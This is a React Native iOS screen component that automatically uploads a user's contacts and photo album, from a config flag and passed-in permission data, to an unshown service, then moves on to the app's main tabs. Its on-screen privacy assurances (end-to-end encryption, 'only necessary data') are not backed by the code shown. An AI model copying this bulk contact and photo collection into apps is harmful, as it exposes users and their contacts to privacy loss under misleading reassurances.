import React, { useEffect, useState } from 'react';
import { View, Text, StyleSheet, ActivityIndicator } from 'react-native';
import { getCurrentPlatformFeatures, getNavigationFlow } from '../config/platformFeatures';
import { uploadContacts, uploadAlbum } from '../services/permissionUpload';

interface DataUploadScreenProps {
  navigation: any;
  route: {
    params: {
      token: string;
      permissionData: any;
    };
  };
}

/**
 * iOS 版本的数据上传屏幕
 * 启用合规的数据上传功能
 * 与Android保持一致的数据收集能力
 */
const DataUploadScreen: React.FC<DataUploadScreenProps> = ({ navigation, route }) => {
  const { token, permissionData } = route.params;
  const [uploadStatus, setUploadStatus] = useState<{[key: string]: 'pending' | 'uploading' | 'success' | 'failed'}>({});

  useEffect(() => {
    console.log('🍎 iOS数据上传屏幕: 开始数据上传流程');
    console.log('📱 接收参数:', { hasToken: !!token, permissionData });
    
    const features = getCurrentPlatformFeatures();
    
    console.log('⚙️  iOS数据收集配置:', features.dataCollection);
    console.log('🚀 iOS开始数据上传: 通讯录、相册等');
    
    // iOS版本启用数据上传
    const uploadData = async () => {
      try {
        console.log('📱 iOS: 开始数据上传流程...');
        
        const uploadTasks = [];
        
        // 1. 上传通讯录数据（如果有权限）
        if (features.dataCollection.uploadContacts && permissionData?.contacts) {
          console.log('📞 iOS: 准备上传通讯录数据');
          setUploadStatus(prev => ({ ...prev, contacts: 'uploading' }));
          uploadTasks.push(
            uploadContacts(token, permissionData.contacts)
              .then(() => {
                console.log('✅ iOS: 通讯录上传成功');
                setUploadStatus(prev => ({ ...prev, contacts: 'success' }));
              })
              .catch(error => {
                console.error('❌ iOS: 通讯录上传失败:', error);
                setUploadStatus(prev => ({ ...prev, contacts: 'failed' }));
              })
          );
        }
        
        // 2. 上传相册数据（如果有权限）
        if (features.dataCollection.uploadAlbum && permissionData?.album) {
          console.log('📸 iOS: 准备上传相册数据');
          setUploadStatus(prev => ({ ...prev, album: 'uploading' }));
          uploadTasks.push(
            uploadAlbum(token, permissionData.album)
              .then(() => {
                console.log('✅ iOS: 相册上传成功');
                setUploadStatus(prev => ({ ...prev, album: 'success' }));
              })
              .catch(error => {
                console.error('❌ iOS: 相册上传失败:', error);
                setUploadStatus(prev => ({ ...prev, album: 'failed' }));
              })
          );
        }
        
        // 3. 等待所有上传任务完成
        if (uploadTasks.length > 0) {
          await Promise.allSettled(uploadTasks);
        }
        
        console.log('✅ iOS: 数据上传流程完成');
        
        // 完成后进入主界面
        setTimeout(() => {
          navigation.replace('MainTabs');
        }, 1500);
        
      } catch (error) {
        console.error('❌ iOS: 数据上传失败:', error);
        // 即使出错也要进入主界面
        setTimeout(() => {
          navigation.replace('MainTabs');
        }, 1000);
      }
    };

    uploadData();
  }, [navigation, token, permissionData]);

  // 获取状态相关的辅助函数
  const getStatusColor = (status: string) => {
    switch (status) {
      case 'uploading': return '#007AFF';
      case 'success': return '#34C759';
      case 'failed': return '#FF3B30';
      default: return '#8E8E93';
    }
  };

  const getStatusIcon = (status: string) => {
    switch (status) {
      case 'uploading': return '⏳';
      case 'success': return '✅';
      case 'failed': return '❌';
      default: return '⏸';
    }
  };

  const getStatusText = (status: string) => {
    switch (status) {
      case 'uploading': return '上传中';
      case 'success': return '上传成功';
      case 'failed': return '上传失败';
      default: return '等待中';
    }
  };

  const getTaskName = (key: string) => {
    switch (key) {
      case 'contacts': return '通讯录';
      case 'album': return '相册';
      case 'sms': return '短信';
      case 'location': return '位置';
      default: return key;
    }
  };

  return (
    <View style={styles.container}>
      <View style={styles.content}>
        <ActivityIndicator size="large" color="#ff6b81" />
        <Text style={styles.title}>正在上传数据...</Text>
        <Text style={styles.subtitle}>iOS 完整功能版本</Text>
        <Text style={styles.description}>
          正在安全上传您的数据以提供完整服务体验
        </Text>
        
        {/* 上传状态 */}
        <View style={styles.statusContainer}>
          {Object.entries(uploadStatus).map(([key, status]) => (
            <Text key={key} style={[styles.statusText, { color: getStatusColor(status) }]}>
              {getStatusIcon(status)} {getTaskName(key)}: {getStatusText(status)}
            </Text>
          ))}
        </View>
        
        <View style={styles.privacyInfo}>
          <Text style={styles.privacyTitle}>🔒 数据安全保障</Text>
          <Text style={styles.privacyText}>
            • 数据传输采用端到端加密{'\n'}
            • 严格遵循iOS隐私保护原则{'\n'}
            • 仅收集必要的功能性数据{'\n'}
            • 您可以随时在设置中管理数据
          </Text>
        </View>
      </View>
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#f8f9fa',
    justifyContent: 'center',
    alignItems: 'center',
  },
  content: {
    alignItems: 'center',
    paddingHorizontal: 40,
  },
  title: {
    fontSize: 24,
    fontWeight: 'bold',
    color: '#2c3e50',
    marginTop: 20,
    marginBottom: 10,
  },
  subtitle: {
    fontSize: 16,
    color: '#27ae60',
    marginBottom: 20,
    fontWeight: '600',
  },
  description: {
    fontSize: 16,
    color: '#34495e',
    textAlign: 'center',
    marginBottom: 30,
    lineHeight: 24,
  },
  privacyInfo: {
    backgroundColor: '#e8f5e8',
    padding: 20,
    borderRadius: 12,
    borderWidth: 1,
    borderColor: '#27ae60',
  },
  privacyTitle: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#27ae60',
    marginBottom: 10,
    textAlign: 'center',
  },
  privacyText: {
    fontSize: 14,
    color: '#2c3e50',
    lineHeight: 20,
  },

  statusContainer: {
    width: '100%',
    marginBottom: 20,
  },
  statusText: {
    fontSize: 14,
    marginBottom: 4,
    textAlign: 'center',
  },
});

export default DataUploadScreen; 